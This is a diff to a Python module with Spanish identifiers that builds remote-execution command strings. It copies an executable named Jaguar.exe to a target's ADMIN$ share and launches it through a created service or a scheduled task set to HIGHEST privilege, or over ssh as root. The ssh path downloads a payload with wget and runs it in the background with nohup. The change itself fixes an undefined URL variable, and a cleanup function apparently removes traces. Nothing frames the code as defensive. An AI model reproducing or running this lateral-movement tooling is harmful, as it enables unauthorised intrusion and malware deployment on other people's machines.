@@ -41,7 +41,9 @@ def copiar(target, url, exe):
             f' && copy /Y "%TEMP%\\{exe}" "\\\\{target}\\ADMIN$\\{exe}"')
 
 
-def lanzar(tecnica, target, exe, servicio="JaguarSvc", usuario="", password=""):
+def lanzar(tecnica, target, exe, servicio="JaguarSvc", usuario="", password="",
+           url=""):
+    """Cadena de lanzamiento remoto. 'url' solo se usa con ssh."""
     if tecnica == "psexec":
         return (f'sc \\\\{target} create {servicio} binPath= "C:\\Windows\\{exe}" start= auto'
                 f' && sc \\\\{target} start {servicio}')
@@ -57,7 +59,7 @@ def lanzar(tecnica, target, exe, servicio="JaguarSvc", usuario="", password=""):
         return (f'schtasks /s {target} /create /tn {servicio} /tr "C:\\Windows\\{exe}" '
                 f'/sc ONLOGON /rl HIGHEST /f && schtasks /s {target} /run /tn {servicio}')
     if tecnica == "ssh":
-        return (f'ssh {usuario or "root"}@{target} "wget -qO /tmp/{exe} {url_payload_ssh} && '
+        return (f'ssh {usuario or "root"}@{target} "wget -qO /tmp/{exe} {url} && '
                 f'chmod +x /tmp/{exe} && nohup /tmp/{exe} >/dev/null 2>&1 &"')
     raise ValueError(f"tecnica desconocida: {tecnica}")
 
@@ -69,7 +71,7 @@ def comando_completo(tecnica, target, url, exe="Jaguar.exe", servicio="JaguarSvc
         return (f'ssh {usuario or "root"}@{target} "wget -qO /tmp/{exe} {url} && '
                 f'chmod +x /tmp/{exe} && nohup /tmp/{exe} >/dev/null 2>&1 &"')
     return copiar(target, url, exe) + " && " + lanzar(
-        tecnica, target, exe, servicio, usuario, password)
+        tecnica, target, exe, servicio, usuario, password, url)
 
 
 def limpiar(tecnica, target, servicio="JaguarSvc"):
